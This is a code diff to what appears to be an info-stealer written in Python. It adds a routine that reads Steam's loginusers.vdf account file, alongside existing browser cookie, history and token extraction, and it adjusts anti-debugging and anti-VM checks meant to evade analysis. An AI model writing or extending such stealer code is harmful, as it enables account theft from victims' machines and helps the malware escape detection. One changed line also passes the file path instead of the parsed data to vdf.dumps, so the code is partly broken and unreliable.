@@ -1,7 +1,6 @@
 import os
 import sys
-
-from core.lib import vdfParser
+import vdf
 
 from core.componets import extractor
 from core.componets import antivm
@@ -44,15 +43,14 @@ class Main:
                 history = extraction.extractHistory(os.path.join(browser, "History"))
                 cookies = extraction.extractCookies(os.path.join(browser))
 
-
     def steam(self):
         steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))
 
         if os.path.exists(steamUsers):
             with open(steamUsers, "r") as f:
-                usersConfig = vdfParser.convert(f.read())
+                usersConfig = vdf.loads(f.read())
 
-            print(usersConfig)
+            print(vdf.dumps(steamUsers, True))
             
             return usersConfig
 
@@ -66,8 +64,9 @@ class Main:
         antivm.Antidbg.proc_check()
         antivm.Antidbg.dll_check()
 
-        antivm.Antidbg.process_check()
+        # antivm.Antidbg.process_check()
 
+        self.steam()
         self.browser()
         self.token()
 
